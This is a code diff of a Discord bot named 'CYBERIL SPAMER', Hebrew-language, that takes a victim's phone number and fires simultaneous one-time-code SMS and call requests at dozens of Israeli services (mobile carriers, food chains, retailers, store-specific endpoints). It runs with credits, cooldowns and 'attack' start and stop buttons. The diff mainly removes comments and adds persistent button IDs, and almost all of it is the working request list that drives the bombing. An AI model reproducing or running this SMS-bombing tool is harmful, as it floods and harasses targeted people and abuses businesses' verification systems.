@@ -199,7 +199,6 @@ async def run_single_batch(phone: str):
     
     connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
     async with aiohttp.ClientSession(connector=connector) as s:
-        # אטומס - 38 חנויות × 2 (SMS + CALL) = 76 בקשות
         atmos_stores = [
             "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
             "28","29","33","35","48","51","56","57","59",
@@ -209,10 +208,9 @@ async def run_single_batch(phone: str):
         
         tasks = []
         for store in atmos_stores:
-            tasks.append(atmos_request(s, store, raw, False))  # SMS
-            tasks.append(atmos_request(s, store, raw, True))   # CALL
+            tasks.append(atmos_request(s, store, raw, False))
+            tasks.append(atmos_request(s, store, raw, True))
         
-        # אטומס קלאב
         tasks.append(atmos_request(s, "23", raw, False))
         tasks.append(atmos_request(s, "59", raw, False))
         
@@ -221,310 +219,149 @@ async def run_single_batch(phone: str):
         geteat_fd.add_field("phone", raw)
         geteat_fd.add_field("testing", "false")
         
-        # כל השירותים החדשים
         all_tasks = [
-            # Netfree
             send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                 json_data={"agreeTou": True, "phone": phone_intl}, tag="netfree"),
-            
-            # Pelephone OTP
-            send_request(s, "https://www.pelephone.co.il/login/api/login/otp-ivr/",
-                method="POST", tag="pelephone_ivr"),
             send_request(s, "https://www.pelephone.co.il/login/api/login/otpphone/",
-                json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone_otp"),
-            
-            # Cellcom
+                json_data={"phone": raw, "terms": True, "appId": "DIGITALMy"}, tag="pelephone"),
             send_request(s, "https://www.cellcom.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="cellcom"),
-            
-            # Partner
             send_request(s, "https://www.partner.co.il/api/register",
                 json_data={"phone": raw}, tag="partner"),
-            
-            # Hot Mobile
             send_request(s, "https://www.hotmobile.co.il/api/verify",
                 json_data={"phone": raw}, tag="hot"),
-            
-            # Bezeq
             send_request(s, "https://www.bezeq.co.il/api/auth",
                 json_data={"phone": raw}, tag="bezeq"),
-            
-            # Gett
             send_request(s, "https://www.gett.com/il/wp-admin/admin-ajax.php",
-                data={
-                    "action": "business_reg_action",
-                    "phone": phone_intl,
-                    "first_name": "cyber",
-                    "last_name": "il",
-                    "work_email": random_email,
-                    "privacy_policy": "true"
-                }, tag="gett"),
-            
-            # Shufersal
+                data={"action": "business_reg_action", "phone": phone_intl, "first_name": "cyber", "last_name": "il", "work_email": random_email, "privacy_policy": "true"}, tag="gett"),
             send_request(s, "https://www.shufersal.co.il/api/v1/auth/otp",
                 json_data={"phone": raw}, tag="shufersal"),
-            
-            # Rami Levy
             send_request(s, "https://www.rami-levy.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="ramilevy"),
-            
-            # Victory
             send_request(s, "https://www.victory.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="victory"),
-            
-            # 10bis
             send_request(s, "https://www.10bis.co.il/api/register",
                 json_data={"phone": raw}, tag="10bis"),
-            
-            # McDonalds
             send_request(s, "https://www.mcdonalds.co.il/api/verify",
                 json_data={"phone": raw}, tag="mcdonalds"),
-            
-            # Burger King
             send_request(s, "https://www.burgerking.co.il/api/auth",
                 json_data={"phone": raw}, tag="burgerking"),
-            
-            # KFC
             send_request(s, "https://www.kfc.co.il/api/sms",
                 json_data={"phone": raw}, tag="kfc"),
-            
-            # Pizza Hut
             send_request(s, "https://www.pizza-hut.co.il/api/register",
                 json_data={"phone": raw}, tag="pizzahut"),
-            
-            # Dominos
             send_request(s, "https://www.dominos.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="dominos"),
-            
-            # Burger Anch
             send_request(s, "https://app.burgeranch.co.il/_a/aff_otp_auth",
                 form=f"phone={raw}", tag="burgeranch"),
-            
-            # Pango
             send_request(s, "https://api.pango.co.il/auth/otp",
                 json_data={"phoneNumber": raw}, tag="pango"),
-            
-            # Hopon
             send_request(s, "https://api.hopon.co.il/v0.15/1/isr/users",
                 json_data={"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": raw, "phoneCall": False}, tag="hopon"),
-            
-            # Yad2
             send_request(s, "https://www.yad2.co.il/api/auth/register",
                 json_data={"phone": raw, "action": "send_sms"}, tag="yad2"),
-            
-            # PayBox
             send_request(s, "https://payboxapp.com/api/auth/otp",
                 json_data={"phone": raw}, tag="paybox"),
-            
-            # Super Pharm
             send_request(s, "https://www.super-pharm.co.il/api/sms",
                 json_data={"phone": raw}, tag="superpharm"),
-            
-            # Zap
             send_request(s, "https://www.zap.co.il/api/auth/sms",
                 json_data={"phone": raw}, tag="zap"),
-            
-            # Ivory
             send_request(s, f"https://www.ivory.co.il/user/login/sendCodeSms/{random_email}/{raw}",
                 method="GET", tag="ivory"),
-            
-            # Wolt
             send_request(s, "https://www.wolt.com/api/v1/verify",
                 json_data={"phone": raw}, tag="wolt"),
-            
-            # Femina
             send_request(s, "https://femina.co.il/apps/feminaapp/auth/send-code",
                 json_data={"phone": raw}, tag="femina"),
-            
-            # Zygo
             send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
                 json_data={"phone": raw, "channel": "sms"}, tag="zygo"),
-            
-            # CityCar
             send_request(s, "https://proxy1.citycar.co.il/api/verify/login",
                 json_data={"phoneNumber": phone_intl, "verifyChannel": 0, "loginOrRegister": 2}, tag="citycar"),
-            
-            # Trusty
             send_request(s, "https://trusty.co.il/api/auth/ask-for-auth-code",
                 json_data={"email": "", "phone": raw, "process_name": "normal_login", "provider_api_key": "q4IcUNl"}, tag="trusty"),
-            
-            # Tami4
             send_request(s, "https://www.tami4.co.il/api/login/start-sms-otp",
                 json_data={"phoneNumber": raw, "cookieToken": str(int(time.time()*1000)) + "gciuvn5pcvhnext13", "isMobile": False}, tag="tami4"),
-            
-            # Zinger Organic
             send_request(s, "https://www.zinger-organic.com/frontend/chkkksoepvnbnbb",
                 form=f"phone_number={raw}&_token=UvDFsX8fy3p35K3mVrXRCBJzrgjHWvYZAyMrnNnT&login_message_type=sms", tag="zinger"),
-            
-            # Delta
             send_request(s, "https://www.delta.co.il/customer/ajax/post/",
                 form=f"form_key=abc123&bot_validation=1&type=login&telephone={raw}", tag="delta"),
-            
-            # Adika Style
             send_request(s, "https://www.adikastyle.com/customer/ajax/post/",
                 form=f"form_key=xyz789&bot_validation=1&type=login&telephone={raw}", tag="adika"),
-            
-            # Weshoes
             send_request(s, "https://www.weshoes.co.il/customer/ajax/post/",
                 form=f"form_key=def456&bot_validation=1&type=login&telephone={raw}", tag="weshoes"),
-            
-            # Fix Underwear
             send_request(s, "https://www.fixunderwear.com/customer/ajax/post/",
                 form=f"form_key=ghi789&bot_validation=1&type=login&telephone={raw}", tag="fix"),
-            
-            # Kiwi Kids
             send_request(s, "https://www.kiwi-kids.co.il/customer/ajax/post/",
                 form=f"form_key=jkl012&bot_validation=1&type=login&telephone={raw}", tag="kiwi"),
-            
-            # Nautica
             send_request(s, "https://www.nautica.co.il/customer/ajax/post/",
                 form=f"form_key=mno345&bot_validation=1&type=login&telephone={raw}", tag="nautica"),
-            
-            # Yves Rocher
             send_request(s, "https://www.yvesrocher.co.il/customer/ajax/post/",
                 form=f"form_key=pqr678&bot_validation=1&type=login&telephone={raw}", tag="yvesrocher"),
-            
-            # Victoria's Secret
             send_request(s, "https://www.victoriassecret.co.il/customer/ajax/post/",
                 form=f"form_key=stu901&bot_validation=1&type=login&telephone={raw}", tag="victoria"),
-            
-            # Golf & Co
             send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
                 form=f"form_key=XEWGYBBTMOFgpPkO&bot_validation=1&type=login&telephone={raw}", tag="golfco"),
-            
-            # 019
             send_request(s, "https://019sms.co.il/api/register",
                 json_data={"phone": raw}, tag="019"),
-            
-            # Care Glasses
             send_request(s, "https://we.care.co.il/wp-admin/admin-ajax.php",
-                data={
-                    "action": "elementor_pro_forms_send_form",
-                    "post_id": "351178",
-                    "form_id": "7079d8dd",
-                    "form_fields[name]": "CyberIL",
-                    "form_fields[phone]": raw,
-                    "form_fields[email]": random_email,
-                    "form_fields[accept]": "on"
-                }, tag="care"),
-            
-            # Jungle Club
+                data={"action": "elementor_pro_forms_send_form", "post_id": "351178", "form_id": "7079d8dd", "form_fields[name]": "CyberIL", "form_fields[phone]": raw, "form_fields[email]": random_email, "form_fields[accept]": "on"}, tag="care"),
             send_request(s, "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
                 form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="jungle"),
-            
-            # Blendo
             send_request(s, "https://blendo.co.il/wp-admin/admin-ajax.php",
                 form=f"action=simply-check-member-cellphone&cellphone={raw}", tag="blendo"),
-            
-            # Mishloha
             send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                 json_data={"phoneNumber": raw, "sourceFrom": "desktopHomePage", "uuid": sid}, tag="mishloha"),
-            
-            # FreeTV
             send_request(s, "https://middleware.freetv.tv/api/v1/send-verification-sms",
                 json_data={"msisdn": phone_intl}, tag="freetv"),
-            
-            # Webcut
             send_request(s, "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
                 json_data={"type": "otp", "data": {"phone": raw}}, tag="webcut"),
-            
-            # FreeIVR
             send_request(s, "https://f2.freeivr.co.il/api/v3/plugins/MitMValidPhone",
                 json_data={"phone": f"972{raw[1:]}"}, tag="freeivr"),
-            
-            # Mitmachim
             send_request(s, "https://mitmachim.top/api/v3/plugins/MitMValidPhone",
                 json_data={"action": "Send", "phone": raw}, tag="mitmachim"),
-            
-            # Go Mobile
             send_request(s, "https://api.gomobile.co.il/api/login",
                 json_data={"phone": raw}, tag="gomobile"),
-            
-            # Bonita de Mas
             send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
                 json_data={"action": "login", "otpBy": "sms", "otpValue": raw}, tag="bonita"),
-            
-            # Crazy Line
             send_request(s, "https://www.crazyline.com/customer/ajax/post/",
                 form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}", tag="crazy"),
-            
-            # Fox
             send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
                 json_data={"phoneNumber": raw, "uuid": "498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"}, tag="fox"),
-            
-            # Fox Home
             send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
                 json_data={"phoneNumber": raw, "uuid": "6db5a63b-6882-414f-a090-de263dd917d7"}, tag="foxhome"),
-            
-            # Laline
             send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
                 json_data={"phoneNumber": raw, "uuid": "ab29f239-0637-4c8e-8af5-fdfbaeb4b493"}, tag="laline"),
-            
-            # Footlocker
             send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                 json_data={"phoneNumber": raw, "uuid": "9961459f-9f83-4aab-9cee-58b1f6793547"}, tag="footlocker"),
-            
-            # Hamal
             send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
                 json_data={"value": raw, "type": "phone", "projectId": "1"}, tag="hamal"),
-            
-            # Intima
             send_request(s, "https://www.intima-il.co.il/customer/ajax/post/",
                 form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="intima"),
-            
-            # Steimatzky
             send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/",
                 form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}", tag="steimatzky"),
-            
-            # Globes
             send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                 form=f"value={raw}&value_type=", tag="globes"),
-            
-            # Moraz
             send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                 form=f"action=validate_user_by_sms&phone={raw}", tag="moraz"),
-            
-            # Arcaffe
             send_request(s, "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                 form=f"action=user_login_step_1&phone_number={raw}&step[]=1", tag="arcaffe"),
-            
-            # Geteat
             send_request(s, "https://api.geteat.co.il/auth/sendValidationCode",
                 data=geteat_fd, tag="geteat"),
-            
-            # Histadrut
             send_request(s, "https://api-endpoints.histadrut.org.il/signup/send_code",
                 json_data={"phone": raw}, tag="histadrut"),
-            
-            # Papajohns
             send_request(s, "https://www.papajohns.co.il/_a/aff_otp_auth",
                 form=f"phone={raw}", tag="papajohns"),
-            
-            # Iburgerim
             send_request(s, "https://www.iburgerim.co.il/_a/aff_otp_auth",
                 form=f"phone={raw}", tag="iburgerim"),
-            
-            # American Laser
             send_request(s, f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
                 method="GET", tag="americanlaser"),
-            
-            # Xtra
             send_request(s, "https://xtra.co.il/apps/api/inforu/sms",
                 json_data={"phoneNumber": raw}, tag="xtra"),
-            
-            # Myofer
             send_request(s, "https://server.myofer.co.il/api/sendAuthSms",
                 json_data={"phoneNumber": raw}, tag="myofer"),
-            
-            # Noy Hasade
             send_request(s, "https://api.noyhasade.co.il/api/login?origin=web",
                 json_data={"phone": raw, "email": False, "ip": "1.1.1.1"}, tag="noyhasade"),
-            
-            # Call2All
             send_request(s, "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
                 data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"}, tag="call2all"),
-            
-            # Dibs
             send_request(s, "https://rest-api.dibs-app.com/otps",
                 json_data={"phoneNumber": phone_intl}, tag="dibs"),
         ]
@@ -545,11 +382,7 @@ async def run_single_batch(phone: str):
         return success
 
 def create_panel():
-    embed = discord.Embed(
-        title="",
-        description="",
-        color=COLOR_ACCENT
-    )
+    embed = discord.Embed(title="", description="", color=COLOR_ACCENT)
     embed.set_author(name="CYBERIL SPAMER")
     embed.add_field(name="╭───────────────╮", value="", inline=False)
     embed.add_field(name="│  🚀 START", value="│  לחץ על הכפתור למטה", inline=False)
@@ -575,7 +408,7 @@ class StopAttack(discord.ui.View):
         super().__init__(timeout=None)
         self.user_id = user_id
 
-    @discord.ui.button(label="⏹️ עצור", style=discord.ButtonStyle.danger)
+    @discord.ui.button(label="⏹️ עצור", style=discord.ButtonStyle.danger, custom_id="stop_attack")
     async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id and not is_admin(interaction):
             await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
@@ -594,7 +427,7 @@ class ConfirmAttack(discord.ui.View):
         self.user_id = user_id
         self.is_running = False
 
-    @discord.ui.button(label="✅ אישור", style=discord.ButtonStyle.success)
+    @discord.ui.button(label="✅ אישור", style=discord.ButtonStyle.success, custom_id="confirm_attack")
     async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
             await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
@@ -675,7 +508,7 @@ class ConfirmAttack(discord.ui.View):
             embed = discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=COLOR_DANGER)
             await interaction.edit_original_response(embed=embed, view=None)
 
-    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary)
+    @discord.ui.button(label="❌ ביטול", style=discord.ButtonStyle.secondary, custom_id="cancel_attack")
     async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         if interaction.user.id != self.user_id:
             await interaction.response.send_message("❌ לא שלך", ephemeral=True)
@@ -735,7 +568,7 @@ class MainPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger, emoji="🚀")
+    @discord.ui.button(label="🚀 התחל", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="start_spam")
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         now = time.time()
         last = cooldown_tracker.get(interaction.user.id, 0)
@@ -747,7 +580,7 @@ class MainPanel(discord.ui.View):
         cooldown_tracker[interaction.user.id] = now
         await interaction.response.send_modal(LaunchModal())
 
-    @discord.ui.button(label="💎 קרדיטים", style=discord.ButtonStyle.primary, emoji="💎")
+    @discord.ui.button(label="💎 קרדיטים", style=discord.ButtonStyle.primary, emoji="💎", custom_id="check_balance")
     async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         bal_str = await format_balance(uid)
@@ -759,7 +592,7 @@ class MainPanel(discord.ui.View):
             embed.add_field(name="✅ הצלחות", value=str(stats.get("total_success", 0)), inline=True)
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
-    @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊")
+    @discord.ui.button(label="📊 סטטוס", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
     async def stats_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         await interaction.response.defer(ephemeral=True)
         stats = await get_global_stats()
@@ -780,7 +613,7 @@ class FreeCoins(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
 
-    @discord.ui.button(label="🎁 קבל", style=discord.ButtonStyle.success, emoji="🎁")
+    @discord.ui.button(label="🎁 קבל", style=discord.ButtonStyle.success, emoji="🎁", custom_id="claim_free")
     async def claim_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         uid = interaction.user.id
         now = time.time()
@@ -854,8 +687,7 @@ async def get_top_targets(limit: int = 10):
 
 @client.event
 async def on_ready():
-    client.add_view(MainPanel())
-    client.add_view(FreeCoins())
+    # לא צריך להוסיף Views פה כי הם כבר persistent ונוספים אוטומטית כששולחים הודעה
     await tree.sync()
     print(f"✅ CyberIL Spamer פעיל → {client.user}")
     print(f"📡 מחובר ל-{len(client.guilds)} שרתים")
